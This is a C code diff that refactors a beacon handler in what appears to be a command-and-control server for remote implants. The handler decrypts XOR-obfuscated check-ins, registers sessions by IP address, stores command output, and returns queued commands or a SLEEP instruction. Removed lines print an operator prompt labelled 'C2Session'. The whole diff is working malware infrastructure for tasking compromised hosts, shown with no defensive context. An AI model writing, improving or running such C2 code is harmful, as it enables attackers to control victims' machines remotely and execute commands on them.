@@ -81,7 +81,16 @@ void NetHandleBeacon(NetSock Listener, Session *S)
     Buf[N] = '\0';
     ApplyXor(Buf, (size_t)N);
 
+    int WasActive = S->Active;
     SessionRegister(S, inet_ntoa(Peer.sin_addr));
+
+    int IsResult = WasActive && strcmp(Buf, "Standby") != 0;
+
+    if (IsResult) {
+        memset(S->LastOutput, 0, BufSize);
+        memcpy(S->LastOutput, Buf, (size_t)N);
+        SessionNotifyOutput(S);
+    }
 
     if (S->HasPending) {
         size_t CmdLen = strlen(S->Pending);
@@ -89,32 +98,12 @@ void NetHandleBeacon(NetSock Listener, Session *S)
         memcpy(Enc, S->Pending, CmdLen);
         ApplyXor(Enc, CmdLen);
         send(Conn, Enc, (int)CmdLen, 0);
-
-        memset(S->LastOutput, 0, BufSize);
-        memcpy(S->LastOutput, Buf, (size_t)N);
-
-        if (S->Interactive && strcmp(Buf, "Standby") != 0) {
-            printf("\n[Output]\n%s\n", S->LastOutput);
-            printf("C2Session[%s]> ", S->Address);
-            fflush(stdout);
-        }
-
         memset(S->Pending, 0, BufSize);
         S->HasPending = 0;
-
     } else {
         char Sleep[] = "SLEEP";
-        size_t SLen  = strlen(Sleep);
-        ApplyXor(Sleep, SLen);
-        send(Conn, Sleep, (int)SLen, 0);
-
-        memcpy(S->LastOutput, Buf, (size_t)N);
-
-        if (S->Interactive && strcmp(Buf, "Standby") != 0) {
-            printf("\n[Output]\n%s\n", S->LastOutput);
-            printf("C2Session[%s]> ", S->Address);
-            fflush(stdout);
-        }
+        ApplyXor(Sleep, strlen(Sleep));
+        send(Conn, Sleep, (int)strlen(Sleep), 0);
     }
 
     NetClose(Conn);
